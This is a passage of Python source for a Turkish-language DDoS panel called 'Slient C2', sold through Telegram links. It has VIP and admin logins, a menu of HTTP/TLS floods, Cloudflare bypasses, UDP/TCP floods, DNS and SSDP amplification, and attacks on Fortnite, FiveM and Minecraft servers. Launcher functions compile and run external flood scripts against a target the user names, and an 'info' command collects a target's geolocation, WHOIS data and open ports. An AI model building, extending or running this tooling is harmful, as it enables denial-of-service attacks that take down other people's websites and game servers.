...
TEMA_VARSAYILAN = 1
TEMALAR = {
    1: {"isim": "Varsayılan (Mavi-Mor)", "palet": [45, 39, 45, 81, 117, 153, 189, 255, 189, 153, 117, 81, 45]},
    ...
    4: {"isim": "Sarı-Turuncu", "palet": [220, 226, 214, 208, 202, 196, 202, 208, 214, 220, 226]},
    ...
    8: {"isim": "Kırmızı-Beyaz", "palet": [160, 196, 203, 210, 217, 224, 231, 224, 217, 210, 203, 196, 160]}
}
...
def tema_listele():
    print("\n" + gradient_text("╔═══════════════════════════════════════════╗"))
    print(gradient_text("║          MEVCUT RENK TEMALARI             ║"))
    print(gradient_text("╠═══════════════════════════════════════════╣"))
    for no, t in TEMALAR.items():
        aktif = " (Aktif)" if no == mevcut_tema else ""
        line = f"  {no}: {t['isim']}{aktif}"
        print(gradient_text("║ " + line.ljust(41) + " ║"))
    print(gradient_text("╚═══════════════════════════════════════════╝"))
...
def history_listele():
    ...
    for i, entry in enumerate(history[-20:], 1):
        ...
        print(gradient_text("║ " + line.ljust(68)[:68] + " ║"))
    print(gradient_text("╚══════════════════════════════════════════════════════════════════════╝\n"))
...
def build_gradient_palette(colors, length):
    ...
    segment_length = max(1, length // total_segments)
...
KUTU_LOGIN = [
    "╔═════════════════════════════════════╗",
    "║      Slient DdoS Login              ║",
    "║   For the password: t.me/SlientBotnet║",
    "╚═════════════════════════════════════╝"
]
...
def show_logo_and_boxes():
    ...
    # ASCII logo (ortalanmış)
    for line in ASCII_LOGO:
        print(gradient_text(line.center(SCREEN_WIDTH)))

    # Logo kutusu (ortalanmış, bitişik)
    for line in KUTU_LOGO:
        print(gradient_text(line.center(SCREEN_WIDTH)))

    # Help kutusu (ortalanmış, bitişik)
    for line in KUTU_HELP:
        print(gradient_text(line.center(SCREEN_WIDTH)))
    print()

    user_status = "VIP" if IS_VIP else "NORMAL"
    print(gradient_text(f"[!] Kullanıcı: {CURRENT_USER} ({user_status})".center(SCREEN_WIDTH)))
    print(gradient_text("[!] 'menu' ile tüm methodları gör.".center(SCREEN_WIDTH)))
    print(gradient_text("[!] 'stop' ile tüm saldırıları durdurabilirsiniz.".center(SCREEN_WIDTH)))
    print()
...
def login():
    ...
    # Login kutusu (ortalanmış)
    for line in KUTU_LOGIN:
        print(gradient_text(line.center(SCREEN_WIDTH)))
    print()
    ...
    if username == ADMIN_USER and password == ADMIN_PASS:
        ...
        IS_VIP = True
        os.system('clear')
        print(gradient_text("[ ADMIN ] | Welcome " + username + " ! | Owner: Zeldy"))
        time.sleep(0.5)
        return True
    ...
    for user in vip_list:
        if user.get("username") == username and user.get("password") == password:
            ...
            IS_VIP = True
            os.system('clear')
            print(gradient_text("[ VIP ] | Welcome " + username + " ! | SlientC2"))
            time.sleep(0.5)
            return True
    ...
    if username and password:
        ...
        IS_VIP = False
        os.system('clear')
        print(gradient_text("[ GUEST ] | Welcome " + username + " ! | Sadece DEFL methodlar"))
        time.sleep(0.5)
        return True
...
def prompt():
    ...
    if PROMPT_STYLE == 1:
        ...
        if PROMPT_GRADIENT:
            ...
            palette = build_gradient_palette([PROMPT_COLOR_2, PROMPT_COLOR_3], len(full_text))
...
def cmd_promptstyle(args):
    global PROMPT_STYLE
    if len(args) < 1:
        print(gradient_text("[!] Kullanım: promptstyle <1|2|3>"))
        return
    try:
        style = int(args[0])
        if style in (1, 2, 3):
            PROMPT_STYLE = style
            print(gradient_text(f"[+] Prompt stili {style} olarak değiştirildi."))
        else:
            print(gradient_text("[!] Sadece 1, 2 veya 3 girin."))
    except ValueError:
        print(gradient_text("[!] Lütfen 1, 2 veya 3 girin."))

def cmd_setprompt(args):
    global PROMPT_SEGMENT_1
    if PROMPT_STYLE != 2:
        print(gradient_text("[!] Bu komut sadece stil 2 aktifken çalışır."))
        return
    if len(args) >= 1:
        new_text = " ".join(args)
        PROMPT_SEGMENT_1 = f" {new_text} "
        print(gradient_text(f"[+] Prompt: {PROMPT_SEGMENT_1}{PROMPT_SEGMENT_2}"))
...
def cmd_promptcolor(args):
    ...
    if len(args) == 0:
        print(gradient_text("\n[?] Kullanım:"))
        print(gradient_text("  promptcolor 1 <renk>                   → Stil 1 yazı rengi"))
        print(gradient_text("  promptcolor 2 <bg1> <bg2> <fg1> <fg2>  → Stil 2 gradient (kutu yok)"))
        print(gradient_text("  promptcolor 3 <renk>                   → Stil 3 yazı rengi"))
        print(gradient_text("  promptcolor gradient <r1> <r2>         → Stil 2 gradient"))
        print(gradient_text("  promptcolor tool                       → Tool teması"))
        print(gradient_text("  promptcolor off                        → Gradient kapat"))
        return
    if args[0].lower() == "off":
        PROMPT_GRADIENT = False
        PROMPT_GRADIENT_TYPE = None
        print(gradient_text("[+] Gradient kapatıldı."))
        return
    if args[0].lower() == "tool":
        PROMPT_GRADIENT = True
        PROMPT_GRADIENT_TYPE = "tool"
        PROMPT_STYLE = 2
        print(gradient_text("[+] Stil 2 gradient -> Tool teması."))
        return
    if args[0].lower() == "gradient":
        if len(args) < 3:
            print(gradient_text("[!] En az 2 renk gerekli."))
            return
        colors = [c.lower() for c in args[1:]]
        for c in colors:
            if c not in valid_colors:
                print(gradient_text(f"[!] Geçersiz renk: {c}"))
                return
        PROMPT_GRADIENT = True
        PROMPT_GRADIENT_TYPE = colors
        PROMPT_STYLE = 2
        print(gradient_text(f"[+] Gradient: {', '.join(colors)}"))
        return
    if args[0] == "1":
        if len(args) < 2:
            print(gradient_text("[!] Kullanım: promptcolor 1 <renk>"))
            return
        c = args[1].lower()
        if c not in valid_colors:
            print(gradient_text(f"[!] Geçersiz renk: {c}"))
        ...
        PROMPT_COLOR_1 = c
        PROMPT_STYLE = 1
        print(gradient_text(f"[+] Stil 1 renk: {c}"))
        return
    if args[0] == "2":
        if len(args) < 5:
            print(gradient_text("[!] Kullanım: promptcolor 2 <bg1> <bg2> <fg1> <fg2>"))
            return
        for c in args[1:5]:
        ...
        PROMPT_STYLE = 2
        PROMPT_GRADIENT = False
        print(gradient_text("[+] Stil 2 renkleri güncellendi."))
        return
    if args[0] == "3":
        if len(args) < 2:
            print(gradient_text("[!] Kullanım: promptcolor 3 <renk>"))
            return
        c = args[1].lower()
        if c not in valid_colors:
            print(gradient_text(f"[!] Geçersiz renk: {c}"))
        ...
        PROMPT_COLOR_1 = c
        PROMPT_STYLE = 3
        print(gradient_text(f"[+] Stil 3 renk: {c}"))
        return
    print(gradient_text("[!] Geçersiz parametre. 'promptcolor' yaz."))
...
def show_attack_banner(target, port, duration, method, threads=None, vip=True, expiry=864.70, cooldown=0.00):
    ...
    for line in attacksent_art:
        print(gradient_text(line.center(60)))
    ...
    print(gradient_text("║" + left(f"  Target: [{target}]") + "║"))
    print(gradient_text("║" + left(f"  Time: [{duration}]s") + "║"))
    print(gradient_text("║" + left(f"  Port: [{port}]") + "║"))
    print(gradient_text("║" + left(f"  Method: [{method_upper}]") + "║"))
    print(gradient_text("╠" + "═" * (width - 2) + "╣"))
    if threads is not None:
        print(gradient_text("║" + left(f"  Threads: [{threads}]") + "║"))
    print(gradient_text("║" + left(f"  VIP: {vip_str}") + "║"))
    print(gradient_text("║" + left(f"  Expiry: [{expiry:.2f}]") + "║"))
    print(gradient_text("║" + left(f"  Cooldown: [{cooldown:.2f}]") + "║"))
    print(gradient_text("║" + left(f"  Timestamp: [{now}]") + "║"))
    print(gradient_text("║" + left(f"  Sent by: [{sent_by}]") + "║"))
    print(gradient_text("║" + empty + "║"))
    print(gradient_text("║" + left("  Join: t.me/artichetm2") + "║"))
    print(gradient_text("║" + left("  Discord: @articnetxv") + "║"))
    print(gradient_text("╚" + border + "╝"))
    print("\n" + gradient_text("[*] Saldırı başlatılıyor... (stop ile durdurabilirsiniz)") + "\n")
...
def check_vip(method_name):
    ...
    print(gradient_text("[!] VIP olmak için: t.me/SlientBotnet\n"))
    return False
...
def cmd_menu():
    ...
    print(gradient_text("╔══════════════════════════════════════════════════════════════════╗"))
    print(gradient_text("║                    SLIENT C2 - METHOD PANEL                      ║"))
    print(gradient_text("╠══════════════════════════════════════════════════════════════════╣"))
    print(gradient_text(f"║  Kullanıcı: {CURRENT_USER} | Durum: {user_status:<48}║"))
    print(gradient_text("╠══════════════════════════════════════════════════════════════════╣"))

    print(gradient_text("║ [ LAYER 7 ]                                                      ║"))
    print(gradient_text("║  httpflood...... <url> <thread> <method> <time>         [DEFL]   ║"))
    print(gradient_text("║  cfpro.......... <url> <thread> <time>                  [VIP]    ║"))
    print(gradient_text("║  flood.......... <url> <time> <thread>                  [DEFL]   ║"))
    print(gradient_text("║  http-raw....... <url> <time>                           [DEFL]   ║"))
    print(gradient_text("║  http-socket.... <url> <thread> <time>                  [DEFL]   ║"))
    print(gradient_text("║  http-rand...... <url> <time>                           [DEFL]   ║"))
    print(gradient_text("║  https-spoof.... <url> <time> <thread>                  [DEFL]   ║"))
    print(gradient_text("║  tls............ <url> <time> <thread>                  [DEFL]   ║"))
    print(gradient_text("║  tls2........... <url> <time> <thread>                  [DEFL]   ║"))
    print(gradient_text("║  tls3........... <url> <time> <thread>                  [DEFL]   ║"))
    print(gradient_text("║  httpflood2..... <url> <time>                           [VIP]    ║"))
    print(gradient_text("║  slow........... <url> <time>                           [DEFL]   ║"))
    print(gradient_text("║  rapid.......... <url> <time> <thread>                  [VIP]    ║"))
    print(gradient_text("║  uambypass...... <url> <time> <thread>                  [VIP]    ║"))
    print(gradient_text("║  httpsbypass.... <url> <time> <thread>                  [VIP]    ║"))
    print(gradient_text("╠══════════════════════════════════════════════════════════════════╣"))

    print(gradient_text("║ [ LAYER 4 ]                                                      ║"))
    print(gradient_text("║  udp............ <ip> <port> <time>                     [DEFL]   ║"))
    print(gradient_text("║  tcpflood....... <ip> <port> <thread> <time> <pps>      [VIP]    ║"))
    print(gradient_text("║  dnsamp......... <ip/url> <time> <thread>               [VIP]    ║"))
    print(gradient_text("║  ssdp........... <ip> <time> <thread>                   [VIP]    ║"))
    print(gradient_text("╠══════════════════════════════════════════════════════════════════╣"))

    print(gradient_text("║ [ GAME ]                                                         ║"))
    print(gradient_text("║  fortnite....... <ip> <port> <time> <pps> <payload>     [DEFL]   ║"))
    print(gradient_text("║  fivem.......... <ip> <time>                            [DEFL]   ║"))
    print(gradient_text("║  minecraft...... <ip> <port> <time>                     [VIP]    ║"))
    print(gradient_text("║  browser........ <url> <time>                           [VIP]    ║"))
    print(gradient_text("╠══════════════════════════════════════════════════════════════════╣"))

    print(gradient_text("║ [ EXTRA ]                                                        ║"))
    print(gradient_text("║  info........... <ip/url>                               [DEFL]   ║"))
    print(gradient_text("║  promptstyle.... <1|2|3>                                [DEFL]   ║"))
    print(gradient_text("║  promptcolor.... <...>                                  [DEFL]   ║"))
    print(gradient_text("║  theme.......... <1-8>                                  [DEFL]   ║"))
    print(gradient_text("║  setprompt...... <metin>                                [DEFL]   ║"))
    print(gradient_text("║  stop...........                                        [DEFL]   ║"))
    print(gradient_text("╚══════════════════════════════════════════════════════════════════╝"))
    print()
    print(gradient_text("[!] VIP methodlar için VIP hesap gerekir."))
    print(gradient_text("[!] VIP olmak için: t.me/SlientBotnet\n"))
...
def cmd_addvip(args):
    ...
    if CURRENT_USER != ADMIN_USER:
        print(gradient_text("[!] Bu komut sadece admin tarafından kullanılabilir!"))
        return
    if len(args) < 2:
        print(gradient_text("[!] Kullanım: addvip <kullanici_adi> <sifre>"))
        return
    username = args[0]
    password = args[1]
    data = load_vip_users()
    for u in data["vip_users"]:
        if u["username"] == username:
            u["password"] = password
            save_vip_users(data)
            print(gradient_text(f"[+] VIP kullanıcı güncellendi: {username}"))
            return
    data["vip_users"].append({"username": username, "password": password})
    save_vip_users(data)
    print(gradient_text(f"[+] VIP kullanıcı eklendi: {username}"))
...
def cmd_delvip(args):
    ...
    if CURRENT_USER != ADMIN_USER:
        ...
        return
    if len(args) < 1:
        print(gradient_text("[!] Kullanım: delvip <kullanici_adi>"))
        return
    username = args[0]
    data = load_vip_users()
    ...
    if len(data["vip_users"]) < original_len:
        save_vip_users(data)
        print(gradient_text(f"[+] VIP kullanıcı silindi: {username}"))
    else:
        print(gradient_text(f"[!] Kullanıcı bulunamadı: {username}"))
...
def cmd_listvip(args):
    ...
    if not vip_list:
        print(gradient_text("    (boş)"))
    else:
        for i, u in enumerate(vip_list, 1):
            print(gradient_text(f"    {i}. {u['username']} / {u['password']}"))
    print()
...
def cmd_info(args):
    if len(args) < 1:
        print(gradient_text("[!] Kullanım: info <IP veya URL>"))
        return
    target = args[0]
    show_attack_banner(target, "N/A", "0", "INFO", threads="Keşif", vip=True)
    print(gradient_text(f"[*] Hedef: {target}"))
    ip, hostname = info_get_ip(target)
    if not ip:
        print(gradient_text(f"[!] IP çözümlenemedi: {hostname}"))
        return
    print(gradient_text(f"[+] IP Adresi: {ip}"))
    print(gradient_text(f"[+] Hostname: {hostname}"))
    geo = info_get_geo(ip)
    if "error" not in geo:
        print(gradient_text(f"\n[+] Konum Bilgisi:"))
        print(gradient_text(f"    Şehir: {geo.get('city', 'N/A')}"))
        print(gradient_text(f"    Bölge: {geo.get('region', 'N/A')}"))
        print(gradient_text(f"    Ülke: {geo.get('country', 'N/A')}"))
        print(gradient_text(f"    ISP/Org: {geo.get('org', 'N/A')}"))
        print(gradient_text(f"    Timezone: {geo.get('timezone', 'N/A')}"))
        print(gradient_text(f"    Koordinat: {geo.get('loc', 'N/A')}"))
    if target.startswith("http"):
        status, server, rtime = info_check_http(target)
        if status:
            print(gradient_text(f"\n[+] HTTP Durum:"))
            print(gradient_text(f"    Durum Kodu: {status}"))
            print(gradient_text(f"    Server: {server}"))
            print(gradient_text(f"    Yanıt Süresi: {rtime}"))
        ...
        if domain and not domain.replace(".", "").isdigit():
            ...
            if "error" not in w:
                print(gradient_text(f"    Registrar: {w.registrar}"))
                print(gradient_text(f"    Oluşturma: {w.creation_date}"))
                print(gradient_text(f"    Son Kullanma: {w.expiration_date}"))
                print(gradient_text(f"    Name Servers: {w.name_servers}"))
    print(gradient_text(f"\n[+] Açık Portlar (yaygın):"))
    open_ports = info_scan_ports(ip)
    if open_ports:
        for p in open_ports:
            print(gradient_text(f"    {p} - AÇIK"))
    else:
        print(gradient_text("    Açık port bulunamadı."))
    print("\n" + gradient_text("="*50) + "\n")
...
def cmd_cikti_goster():
    global CIKTI_GOSTER
    CIKTI_GOSTER = True
    print(gradient_text("[+] Saldırı çıktıları AÇILDI."))

def cmd_cikti_kapan():
    global CIKTI_GOSTER
    CIKTI_GOSTER = False
    print(gradient_text("[+] Saldırı çıktıları KAPATILDI."))
...
def cmd_stop():
    ...
    try:
        ...
        pass
    if killed > 0:
        print(gradient_text(f"[+] {killed} saldırı prosesi sonlandırıldı."))
    else:
        print(gradient_text("[!] Çalışan saldırı prosesi bulunamadı."))
...
def run_script(script_name, args):
    ...
    if not os.path.exists(script_name):
        ...
        if possible:
            ...
            print(gradient_text(f"[!] {script_name} dosyası bulunamadı!"))
            return
    ...
    try:
        ...
        print(gradient_text(f"[!] Beklenmeyen hata: {e}"))
...
def run_go_script(script_name, args):
    ...
    try:
        ...
        print(gradient_text("[!] 'go' komutu bulunamadı."))

def run_cfpro_script(url, threads, seconds):
    global active_processes
    if not os.path.exists("cf-pro.py"):
        print(gradient_text("[!] cf-pro.py bulunamadı!"))
        return
    try:
...
def run_node_script(script_name, args):
    ...
    try:
        ...
        print(gradient_text("[!] 'node' komutu bulunamadı."))

def run_c_binary(binary_name, args):
    global active_processes
    if not os.path.exists(binary_name):
        if os.path.exists("tcp.c"):
            print(gradient_text("[*] tcp.c derleniyor..."))
            try:
                subprocess.run(["gcc", "tcp.c", "-o", binary_name, "-lpthread"], check=True)
                print(gradient_text("[+] Derleme başarılı."))
            except:
                print(gradient_text("[!] Derleme hatası."))
                return
        else:
            print(gradient_text(f"[!] {binary_name} ve tcp.c bulunamadı!"))
            return
...
def run_perl_script(script_name, args):
    ...
    try:
        ...
        print(gradient_text("[!] 'perl' komutu bulunamadı."))
    ...
    if not os.path.exists(binary_name):
        ...
        for f in ["minecraft.go", "rapid.go"]:
            if os.path.exists(f):
                ...
                break
        if gofile:
            print(gradient_text(f"[*] {gofile} derleniyor..."))
            try:
            ...
            print(gradient_text(f"[!] {binary_name} ve .go bulunamadı!"))
            return
    cmd = ["./" + binary_name] + args
    try:
        proc = subprocess.Popen(cmd) if CIKTI_GOSTER else subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
...
def cmd_udp(args):
    if len(args) < 3:
        print(gradient_text("[!] Kullanım: udp <ip> <port> <süre>"))
        return
...
def cmd_httpflood(args):
    if len(args) < 4:
        print(gradient_text("[!] Kullanım: httpflood <url> <threads> <get/post> <seconds> [header]"))
        return
...
def cmd_cfpro(args):
    ...
    if len(args) < 3:
        print(gradient_text("[!] Kullanım: cfpro <url> <threads> <seconds>"))
        return
...
def cmd_flood(args):
    if len(args) < 3:
        print(gradient_text("[!] Kullanım: flood <url> <süre> <thread>"))
        return
...
def cmd_httpraw(args):
    if len(args) < 2:
        print(gradient_text("[!] Kullanım: http-raw <url> <süre>"))
        return
...
def cmd_httpsocket(args):
    if len(args) < 3:
        print(gradient_text("[!] Kullanım: http-socket <url> <thread> <süre>"))
        return
...
def cmd_httprand(args):
    if len(args) < 2:
        print(gradient_text("[!] Kullanım: http-rand <url> <süre>"))
        return
    url, duration = args[0], args[1]
    port = "443" if url.startswith("https") else "80"
...
def cmd_httpspoof(args):
    if len(args) < 3:
        print(gradient_text("[!] Kullanım: https-spoof <url> <süre> <thread>"))
        return
    url, duration, threads = args[0], args[1], args[2]
    port = "443" if url.startswith("https") else "80"
...
def cmd_tls(args):
    if len(args) < 3:
        print(gradient_text("[!] Kullanım: tls <url> <süre> <thread>"))
        return
    url, duration, threads = args[0], args[1], args[2]
    port = "443" if url.startswith("https") else "80"
...
def cmd_tls2(args):
    if len(args) < 3:
        print(gradient_text("[!] Kullanım: tls2 <url> <süre> <thread>"))
        return
    url, duration, threads = args[0], args[1], args[2]
    port = "443" if url.startswith("https") else "80"
...
def cmd_tls3(args):
    if len(args) < 3:
        print(gradient_text("[!] Kullanım: tls3 <url> <süre> <thread>"))
        return
    url, duration, threads = args[0], args[1], args[2]
    port = "443" if url.startswith("https") else "80"
...
def cmd_httpflood2(args):
    ...
    if len(args) < 2:
        print(gradient_text("[!] Kullanım: httpflood2 <url> <süre>"))
        return
    url, duration = args[0], args[1]
    port = "443" if url.startswith("https") else "80"
    ...
    if not os.path.exists("proxy.txt"):
        print(gradient_text("[!] proxy.txt bulunamadı!"))
        return
    run_node_script("httpflood2.js", [url, duration])

def cmd_slow(args):
    if len(args) < 2:
        print(gradient_text("[!] Kullanım: slow <url> <süre>"))
        return
    url, duration = args[0], args[1]
    port = "443" if url.startswith("https") else "80"
...
def cmd_tcpflood(args):
    ...
    if len(args) < 6:
        print(gradient_text("[!] Kullanım: tcpflood <IP> <PORT> <THREAD> <TIME> <PPS> <FLAG>"))
        return
...
def cmd_fortnite(args):
    if len(args) < 5:
        print(gradient_text("[!] Kullanım: fortnite <IP> <PORT> <SÜRE> <PPS> <PAYLOAD>"))
        return
...
def cmd_fivem(args):
    if len(args) < 2:
        print(gradient_text("[!] Kullanım: fivem <IP> <SÜRE>"))
        return
...
def cmd_browser(args):
    ...
    if len(args) < 2:
        print(gradient_text("[!] Kullanım: browser <URL> <SÜRE>"))
        return
    url, duration = args[0], args[1]
    threads = "1250"
    port = "443" if url.startswith("https") else "80"
...
def cmd_minecraft(args):
    ...
    if len(args) < 3:
        print(gradient_text("[!] Kullanım: minecraft <IP> <PORT> <SÜRE>"))
        return
    ip, port, duration = args[0], args[1], args[2]
...
def cmd_theme(args):
    ...
    try:
        ...
        if tema_degistir(tema_no):
            print(gradient_text(f"[+] Tema '{TEMALAR[tema_no]['isim']}' aktif."))
            show_logo_and_boxes()
        else:
            print(gradient_text("[!] Geçersiz tema."))
    except ValueError:
        print(gradient_text("[!] Sayı girin. Örnek: theme 8"))
...
def cmd_help():
    os.system('clear')
    print(gradient_text("╔════════════════════════════════════════════════╗"))
    print(gradient_text("║          SLIENT C2 KOMUT LİSTESİ               ║"))
    print(gradient_text("╠════════════════════════════════════════════════╣"))
    print(gradient_text("║  menu        - Tüm methodları göster           ║"))
    print(gradient_text("║  L7 / L4 / game - Kategori menüleri            ║"))
    print(gradient_text("║  info        - Hedef bilgisi topla             ║"))
    print(gradient_text("║  promptstyle - Prompt stili (1/2/3)            ║"))
    print(gradient_text("║  promptcolor - Prompt renkleri                 ║"))
    print(gradient_text("║  setprompt   - Prompt metni (stil 2)           ║"))
    print(gradient_text("║  theme       - Tema değiştir (1-8)             ║"))
    print(gradient_text("║  history     - Saldırı geçmişi                 ║"))
    print(gradient_text("║  stop        - Tüm saldırıları durdur          ║"))
    print(gradient_text("║  clear       - Ekranı temizle                  ║"))
    if CURRENT_USER == ADMIN_USER:
        print(gradient_text("║  addvip      - VIP kullanıcı ekle (admin)      ║"))
        print(gradient_text("║  delvip      - VIP kullanıcı sil (admin)       ║"))
        print(gradient_text("║  listvip     - VIP listesi (admin)             ║"))
    print(gradient_text("║  exit        - Çıkış                           ║"))
    print(gradient_text("╚════════════════════════════════════════════════╝\n"))
    ...
    try:
        while True:
            ...
            if cmd in ("exit", "quit", "q"):
                ...
                print(gradient_text(f"Bilinmeyen komut: '{cmd}'. 'help' yazın."))
    except KeyboardInterrupt:
        print("\n" + gradient_text("Çıkılıyor..."))
        sys.exit(0)
